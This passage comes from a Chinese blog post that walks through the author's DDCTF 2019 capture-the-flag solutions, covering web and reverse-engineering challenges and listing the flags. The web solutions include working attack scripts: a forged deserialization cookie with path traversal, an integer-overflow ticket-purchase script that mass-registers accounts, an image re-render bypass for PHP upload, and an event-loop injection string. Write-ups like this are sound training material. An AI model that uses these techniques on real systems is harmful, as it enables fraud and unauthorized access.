denied'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># min</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0016221320356399412</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># max</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0013153755213765853</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># mean</span></span><br><span class="line"><span class="comment"># sqr diff = 0.0010791667492742317</span></span><br><span class="line"><span class="comment"># access denied</span></span><br><span class="line"><span class="comment"># DDCTF&#123;VOICE_ENCODED_CHAL&#125;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="web">Web</span></h2><h3><span id="滴">滴</span></h3><p>发现jpg是flag.jpg的hex再base64两次的结果，泄露完index.php后提示看博客。脑洞太大坑了好久，最后发现是practice.txt.swp文件里有东西。。base64解码提示f1ag!ddctf.php,用f1agconfigddctf.php读源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>附上uid访问/f1ag!ddctf.php拿到flag：DDCTF{436f6e67726174756c6174696f6e73}</p>
+<h3><span id="web签到题">web签到题</span></h3><p>向app/Auth.php接口发送请求修改didictf_username为admin，此时可以看源码发现flag可以通过请求app/session.php得到，漏洞为php反序列化字符串漏洞需要先泄露出key值: post发送请求nickname：%s可以拿到key之后需要通过MD5校验，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://117.51.158.44/app/Session.php"</span></span><br><span class="line">key = <span class="string">'EzblrbNS'</span></span><br><span class="line">Application = <span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"....//config/flag.txt";&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enCookie</span><span class="params">()</span>:</span></span><br><span class="line">    hash = hashlib.md5((key + Application).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    rslt = urllib.parse.quote(Application) + hash</span><br><span class="line">    <span class="keyword">return</span> rslt</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">'ddctf_id='</span> + enCookie() + <span class="string">';expires=Thu, 18-Apr-2019 01:33:01 GMT; Max-Age=7200'</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: cookie, <span class="string">'didictf_username'</span>: <span class="string">'admin'</span>&#125;</span><br><span class="line">r = requests.post(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<h3><span id="upload-img">Upload-IMG</span></h3><p>很明显的二次渲染绕过问题，在github上找了个二次渲染绕过的php脚本jpg_payload，根据提示多挑几张图不同尺寸的大图先丢给服务器渲染，download下来使用jpg_payload写入提示的code:<code>phpinfo()</code>，再次上传成功绕过二次渲染。[Success]<code>Flag=DDCTF{B3s7_7ry_php1nf0_d35382a128639fad}</code></p>
+<h3><span id="大吉大利今晚吃鸡">大吉大利今晚吃鸡</span></h3><p>chrome f12发现买票价格可以自己控制，尝试大整数溢出。当<code>price=3458764513820540928</code>时可以使用100元进行购票。购票函数如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buyTicket</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	ticket_price = &#123;<span class="string">'ticket_price'</span>: <span class="string">'3458764513820540928'</span>&#125;</span><br><span class="line">	buy_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket'</span></span><br><span class="line">	r = requests.get(buy_ticket_url, params = ticket_price, headers = headers)</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'购买门票成功'</span>:</span><br><span class="line">		<span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<p>支付：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payTicket</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	pay_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket'</span></span><br><span class="line">	pay_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">	r = requests.get(pay_ticket_url, params = pay_info, headers = headers)</span><br><span class="line">	print(r.json())</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'交易成功'</span>:</span><br><span class="line">		id_str = str(r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>])</span><br><span class="line">		ticket = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line">		result = &#123;<span class="string">'id'</span>: id_str, <span class="string">'ticket'</span>: ticket&#125;</span><br><span class="line">		enermys.append(result)</span><br><span class="line">		<span class="keyword">return</span> result</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<p>购票成功后发现要移除100选手，而且不能是自己，于是循环注册购票移除</p>
+<p>整个脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">my_cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'user_name=yjw; REVEL_SESSION=db854a913e6c2730a72c83d5b3503096'</span>&#125;</span><br><span class="line">my_ticket = &#123;<span class="string">'id'</span>: <span class="string">'147'</span>, <span class="string">'ticket'</span>: <span class="string">'4cc522f84f11189d9737ab18fc22fcd0'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(num)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		name_str = <span class="string">'yjw111111111111'</span> + str(num)</span><br><span class="line">		register_url = <span class="string">'http://117.51.147.155:5050/ctf/api/register'</span></span><br><span class="line">		register_info = &#123;<span class="string">'name'</span>: name_str, <span class="string">'password'</span>: <span class="string">'1234567890'</span>&#125;  </span><br><span class="line">		r = requests.get(register_url, params = register_info)</span><br><span class="line">		<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span>:</span><br><span class="line">			Cookie = r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">			Cookie = Cookie.split(<span class="string">' '</span>)</span><br><span class="line">			Cookie = Cookie[<span class="number">0</span>] + Cookie[<span class="number">2</span>]</span><br><span class="line">			<span class="keyword">return</span> Cookie</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			 num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isLogin</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	is_login_url = <span class="string">'http://117.51.147.155:5050/ctf/api/is_login'</span></span><br><span class="line">	r = requests.get(is_login_url, headers = headers)</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'您已登陆'</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">(name_str)</span>:</span></span><br><span class="line">	signin_info = &#123;<span class="string">'name'</span>: name_str, <span class="string">'password'</span>:<span class="string">'1234567890'</span>&#125;</span><br><span class="line">	signin_url = <span class="string">'http://117.51.147.155:5050/ctf/api/login'</span></span><br><span class="line">	r = requests.get(signin_url, params = signin_info)</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span>:</span><br><span class="line">		Cookie = r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">		Cookie = Cookie.split(<span class="string">' '</span>)</span><br><span class="line">		Cookie = Cookie[<span class="number">0</span>] + Cookie[<span class="number">2</span>]</span><br><span class="line">		<span class="keyword">return</span> Cookie</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buyTicket</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	ticket_price = &#123;<span class="string">'ticket_price'</span>: <span class="string">'3458764513820540928'</span>&#125;</span><br><span class="line">	buy_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket'</span></span><br><span class="line">	r = requests.get(buy_ticket_url, params = ticket_price, headers = headers)</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'购买门票成功'</span>:</span><br><span class="line">		<span class="keyword">return</span> r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payTicket</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	pay_ticket_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket'</span></span><br><span class="line">	pay_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">	r = requests.get(pay_ticket_url, params = pay_info, headers = headers)</span><br><span class="line">	print(r.json())</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'交易成功'</span>:</span><br><span class="line">		id_str = str(r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>])</span><br><span class="line">		ticket = r.json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</span><br><span class="line">		result = &#123;<span class="string">'id'</span>: id_str, <span class="string">'ticket'</span>: ticket&#125;</span><br><span class="line">		enermys.append(result)</span><br><span class="line">		<span class="keyword">return</span> result</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recallBill</span><span class="params">(Cookie_str, bill_id_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	recall_bill_url = <span class="string">'http://117.51.147.155:5050/ctf/api/recall_bill'</span></span><br><span class="line">	bill_info = &#123;<span class="string">'bill_id'</span>: bill_id_str&#125;</span><br><span class="line">	r = requests.get(recall_bill_url, params = bill_info, headers = headers)</span><br><span class="line">	<span class="keyword">if</span> r.json()[<span class="string">'status_code'</span>] == <span class="number">200</span> <span class="keyword">and</span> r.json()[<span class="string">'msg'</span>] == <span class="string">'订单已取消'</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showResult</span><span class="params">(Cookie_str)</span>:</span></span><br><span class="line">	headers = &#123;<span class="string">'Cookie'</span>: Cookie_str&#125;</span><br><span class="line">	result_url = <span class="string">'http://117.51.147.155:5050/ctf/api/search_ticket'</span></span><br><span class="line">	r = requests.get(result_url, headers = headers)</span><br><span class="line">	enermys.append()</span><br><span class="line"></span><br><span class="line">enermys = []</span><br><span class="line">cnt = <span class="number">5</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	cookie = register(num)</span><br><span class="line">	print(cookie)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> isLogin(cookie):</span><br><span class="line">		signin(cookie)</span><br><span class="line">	bill_id = buyTicket(cookie)</span><br><span class="line">	print(bill_id)</span><br><span class="line">	enermy = payTicket(cookie, bill_id)</span><br><span class="line">	print(enermy)</span><br><span class="line">	num += <span class="number">1</span></span><br><span class="line">	url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot'</span></span><br><span class="line">	my_headers = my_cookie</span><br><span class="line">	r1 = requests.get(url, headers=my_headers, params=enermy)</span><br><span class="line">	print(r1.json())</span><br><span class="line">	<span class="keyword">if</span> r1.json()[<span class="string">'data'</span>] != []:</span><br><span class="line">		cnt -= <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> cnt == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line">print(enermys)</span><br></pre></td></tr></table></figure>
+<h3><span id="homebrew_event_loop">homebrew_event_loop</span></h3><p>发现execute_event_loop()函数中可以输入<code>?action:function#;arg1;argn</code>型字符串执行<code>function([arg1,arg2])</code></p>
+<p>构造event链 <code>?action:trigger_event#;action:buy;5#action:get_flag;</code>先买5个在get_flag，此时session[‘log’]中会有flag</p>
+<p>利用flask session至签名不加密的性质，base64解密cookie可以得到flag。脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(str)</span>:</span></span><br><span class="line">    rslt = str.replace(<span class="string">'-'</span>, <span class="string">'+'</span>).replace(<span class="string">'_'</span>,<span class="string">'/'</span>)</span><br><span class="line">    length = len(rslt)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        rslt += <span class="string">'==='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        rslt += <span class="string">'=='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        rslt += <span class="string">'='</span></span><br><span class="line">    <span class="keyword">elif</span> length % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        rslt = rslt</span><br><span class="line">    rslt = base64.b64decode(rslt)</span><br><span class="line">    rslt = zlib.decompress(rslt)</span><br><span class="line">    print(rslt)</span><br><span class="line">    <span class="keyword">return</span> rslt    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(sys.argv[<span class="number">1</span>])</span><br><span class="line">    json_str = cut(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(json_str)</span><br><span class="line">    rslt = decode(json_str)</span><br><span class="line">    print(rslt)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h2><span id="reverse">Reverse</span></h2><h3><span id="windows1">windows1</span></h3><p>file之后就能看到upx壳，去壳之后丢ida静态分析，很容易看到关键代码是一段查表：</p>
+<p>大致猜出来表的位置在0x403018, 扣出来丢python里，取index使结果为<code>DDCTF{reverseME}</code>，表地址和byte_402FF8的偏移是32, 解出来转ascii得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="number">0x3018</span> - <span class="number">0x2ff8</span></span><br><span class="line">Out[<span class="number">1</span>]: <span class="number">32</span></span><br><span class="line">In [<span class="number">2</span>]: tab = <span class="string">'~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('</span></span><br><span class="line">In [<span class="number">3</span>]: ans = <span class="string">'DDCTF&#123;reverseME&#125;'</span></span><br><span class="line">In [<span class="number">4</span>]: flag = <span class="string">''</span>.join([ chr(tab.index(s)+<span class="number">32</span>) <span class="keyword">for</span> s <span class="keyword">in</span> ans])</span><br></pre></td></tr></table></figure>
+<h3><span id="windows2">windows2</span></h3><p>先查壳，脱壳后丢进ida</p>
+<p>静态分析代码，输入进过一系列操作要输出<code>reverse+</code>，长度要是偶数</p>
+<p>之后的函数中发现函数有查表 表中每一项异或一个数得到的表恰好是base64加密解密的表</p>
+<p>推测加密函数与base64有关</p>
+<p>进一步分析发现时base64解密函数</p>
+<p>执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b64decode(<span class="string">'reverse+'</span>)</span><br></pre></td></tr></table></figure>
+<p>即可</p>
+<h3><span id="confused">Confused</span></h3><p>使用hopper和ida进行逆向</p>
+<p>先确定长度为开头<code>DDCTF{</code>  中间长度0x12 最后为<code>}</code></p>
+<p>进一步确定中间字符</p>
+<p>发现函数在栈中进行了一个初始化 大概长这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">a = [</span><br><span class="line">    <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x100001995</span>, <span class="comment"># xxxxf3 stop</span></span><br><span class="line">    <span class="number">0xF0</span>,</span><br><span class="line">    <span class="number">0x100001D70</span>,</span><br><span class="line">    <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0x100001a60</span>,</span><br><span class="line">    <span class="number">0xf2</span>,</span><br><span class="line">    <span class="number">0x100001aa0</span>,</span><br><span class="line">    <span class="number">0xf4</span>,</span><br><span class="line">    <span class="number">0x100001cb0</span>,</span><br><span class="line">    <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0x100001b10</span>,</span><br><span class="line">    <span class="number">0xf3</span>,</span><br><span class="line">    <span class="number">0x100001b70</span>,</span><br><span class="line">    <span class="number">0xf6</span>,</span><br><span class="line">    <span class="number">0x100001b10</span>,</span><br><span class="line">    <span class="number">0xf7</span>,</span><br><span class="line">    <span class="number">0x100001d30</span>,</span><br><span class="line">    <span class="number">0xf8</span>,</span><br><span class="line">    <span class="number">0x100001c60</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>a[0]的值为每一次应该输入的字符，在接下来的运行中会逐步变化。没运行一轮做一次判断，若不相等跳至fail</p>
+<p>动态调试修改内存就能得到结果了</p>
+<p><code>[0X68, 0X65, 0X6C, 0x6c, 0x6f,0x59, 0x6F, 0x75, 0x47, 0x6F, 0x74, 0x54, 0x68, 0x65, 0x46, 0x6c, 0x61, 0x67]</code></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/04/19/DDCTF-2019-WriteUp/">DDCTF 2019 Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">hustcw</a></p>
+        <p><span>发布时间:</span>2019-04-19, 14:23:04</p>
+        <p><span>最后更新:</span>2019-09-24, 02:38:52</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/19/DDCTF-2019-WriteUp/" title="DDCTF 2019 Writeup">https://hustcw.github.io/2019/04/19/DDCTF-2019-WriteUp/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hustcw.github.io/2019/04/19/DDCTF-2019-WriteUp/　　作者: hustcw" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/04/20/OSX装angr/">
+                    OSX装angr
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/04/11/堆利用——布局内存任意地址写/">
+                    堆利用——布局内存任意地址写
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.1.</span> <span class="toc-text">真-签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.2.</span> <span class="toc-text">北京地铁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.3.</span> <span class="toc-text">strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.4.</span> <span class="toc-text">Wireshark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.5.</span> <span class="toc-text">联盟决策大会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.6.</span> <span class="toc-text">伪-声纹锁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">滴</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.2.</span> <span class="toc-text">web签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.3.</span> <span class="toc-text">Upload-IMG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.4.</span> <span class="toc-text">大吉大利今晚吃鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.5.</span> <span class="toc-text">homebrew_event_loop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">4.1.</span> <span class="toc-text">windows1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">4.2.</span> <span class="toc-text">windows2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span 